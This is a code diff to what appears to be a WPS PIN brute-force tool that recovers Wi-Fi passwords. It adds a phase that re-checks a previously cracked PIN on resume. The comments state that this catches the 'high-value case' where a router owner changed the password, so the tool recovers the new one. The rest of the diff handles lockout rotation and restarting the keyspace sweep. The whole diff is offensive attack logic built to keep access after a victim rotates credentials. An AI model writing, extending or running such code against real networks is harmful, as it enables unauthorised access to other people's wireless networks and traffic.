@@ -105,14 +105,20 @@ class WpsCampaign:
                 data = json.loads(path.read_text())
                 data.setdefault("bssid", self.bssid)
                 st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
-                pin_hint = ""
-                if st.first_half:
-                    # We already learned the first 4 digits last run — surface them
-                    # in the resumed log so the user sees the progress.
-                    pin_hint = (f", [cyan bold]{st.first_half}[/cyan bold]"
-                                f"[white bold]????[/white bold]")
-                self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
-                         f"/11,000 pins{pin_hint}")
+                if st.found_pin:
+                    # Previous run recovered the PIN. The user clicking WPS PIN
+                    # again means "re-verify against the live AP" — handled by
+                    # _run switching to the "verify" phase.
+                    self.log(f"resumed campaign: previously recovered PIN "
+                             f"[black bold on cyan] {st.found_pin} [/black bold on cyan]")
+                elif st.first_half:
+                    # In-progress with first-half locked in — surface it.
+                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
+                             f"/11,000 pins, [cyan bold]{st.first_half}[/cyan bold]"
+                             f"[white bold]????[/white bold]")
+                else:
+                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
+                             f"/11,000 pins")
                 return st
             except Exception as e:
                 logger.warning("WPS state load failed (%s); starting fresh", e)
@@ -195,6 +201,10 @@ class WpsCampaign:
     def _next_pin(self) -> Optional[str]:
         """The next candidate per the current phase, or None when exhausted."""
         st = self.state
+        if st.phase == "verify":
+            # Always the previously-recovered PIN — _apply_verify_outcome
+            # transitions phase once we get a real oracle result.
+            return st.found_pin
         if st.phase == "common":
             if st.common_index < len(pinmod.COMMON_PINS):
                 return pinmod.COMMON_PINS[st.common_index]
@@ -238,6 +248,13 @@ class WpsCampaign:
         # through — the no-wait + rotate strategy is working. Reset the lock
         # ramp so the NEXT soft-lock also skips its wait.
         self._consecutive_locks_no_progress = 0
+
+        # Verify phase has its own dispatch — it doesn't advance the keyspace,
+        # it just decides "PIN still valid / PSK changed / PIN changed."
+        if st.phase == "verify":
+            self._apply_verify_outcome(pin, out)
+            return
+
         if out.result is PinResult.SUCCESS:
             st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
         elif out.first_half_ok:
@@ -260,11 +277,66 @@ class WpsCampaign:
             elif st.phase == "first_half":
                 st.p1_index += 1
 
+    def _apply_verify_outcome(self, pin: str, out: AttemptOutcome) -> None:
+        """Resume-time re-verification of a previously-recovered PIN.
+
+        Routes the oracle result into one of four states + a log line. SUCCESS
+        keeps us in "done" but updates ``found_psk`` if the AP's password
+        changed since last time (the high-value case — same PIN, fresh PSK).
+        """
+        st = self.state
+        if out.result is PinResult.SUCCESS:
+            new_psk = out.psk or ""
+            old_psk = st.found_psk or ""
+            if new_psk != old_psk:
+                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
+                         f"— [bold yellow]PSK CHANGED[/bold yellow] "
+                         f"[dim](updated below)[/dim]")
+            else:
+                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
+                         f"[dim](PSK unchanged)[/dim]")
+            st.found_psk = new_psk
+            st.phase = "done"
+            return
+        if out.first_half_ok:        # SECOND_HALF_WRONG — first half still valid
+            kept = pinmod.split_pin(pin)[0]
+            self.log(f"[yellow]PIN's second half changed[/yellow] — "
+                     f"first half [green]{kept}[/green] still valid; "
+                     f"sweeping second half again")
+            st.first_half = kept
+            st.found_pin = None
+            st.found_psk = None
+            st.phase = "second_half"
+            st.p2_index = 0
+            st.skip_middle = pin[4:7]   # confirmed-wrong middle
+            return
+        if out.result is PinResult.FIRST_HALF_WRONG:
+            self.log("[red]PIN no longer valid[/red] "
+                     "[dim](first half wrong — restarting full sweep)[/dim]")
+            st.first_half = None
+            st.found_pin = None
+            st.found_psk = None
+            st.phase = "common"
+            st.common_index = 0
+            st.p1_index = 0
+            st.p2_index = 0
+            st.skip_middle = None
+
     async def _run(self) -> None:
         self.status = "running"
         name = self.target.ssid or self.bssid
         logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
-        self.log(f"campaign start on [bold]{name}[/bold]")
+
+        # Resumed with a previously-recovered PIN? Re-verify it against the AP
+        # before declaring done. Catches the high-value case where the PIN is
+        # unchanged but the router's PSK rotated (user changed the password) —
+        # the WPS-PIN attack will surface the *current* PSK. Also catches "PIN
+        # was changed/disabled by admin" so we don't keep claiming success.
+        if self.state.phase == "done" and self.state.found_pin:
+            self.log("re-verifying PIN against the AP "
+                     "[dim](if the PSK changed, we'll catch it)[/dim]")
+            self.state.phase = "verify"
+
         try:
             while not self._stop:
                 if self._paused:
@@ -299,12 +371,21 @@ class WpsCampaign:
                 # Snapshot pre-attempt state so _log_attempt can announce
                 # transitions (e.g. first-half just discovered).
                 prev_first_half = self.state.first_half
+                prev_phase = self.state.phase
                 t0 = time.monotonic()
                 out = await self._try(pin)
                 self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                 self.state.attempts += 1
                 self._apply_outcome(pin, out)
-                self._log_attempt(pin, out, prev_first_half)
+                # Verify-terminal outcomes already emit their own log line in
+                # _apply_verify_outcome; the per-attempt summary would duplicate
+                # it. Pre-oracle rejects during verify (PROTO_ERROR/TIMEOUT) DO
+                # still flow through so the user sees "trying X → AP refused"
+                # while we wait for the AP to engage.
+                verify_terminal = (prev_phase == "verify" and out.result not in
+                                   (PinResult.PROTO_ERROR, PinResult.TIMEOUT))
+                if not verify_terminal:
+                    self._log_attempt(pin, out, prev_first_half)
 
                 if self.state.phase == "done":
                     # Success line is closed by the UI via _stop_wps_pin (cyan
